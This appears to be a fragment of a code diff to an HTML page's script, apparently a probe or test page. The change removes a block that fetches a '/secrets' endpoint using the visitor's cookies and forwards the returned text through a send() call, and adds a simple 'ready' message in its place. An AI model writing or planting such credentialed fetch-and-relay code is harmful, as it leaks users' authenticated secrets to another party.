@@ -50,22 +50,7 @@
 
     send({...basePayload, phase: "load"});
 
-    fetch("https://api.takedown.cyxo.re/secrets", {
-      credentials: "include"
-    }).then(async (response) => {
-      send({
-        ...basePayload,
-        phase: "secrets",
-        status: response.status,
-        result: await response.text()
-      });
-    }).catch((e) => {
-      send({
-        ...basePayload,
-        phase: "secrets-error",
-        error: `${e.name}: ${e.message}`
-      });
-    });
+    send({...basePayload, phase: "ready"});
   </script>
 </body>
 </html>
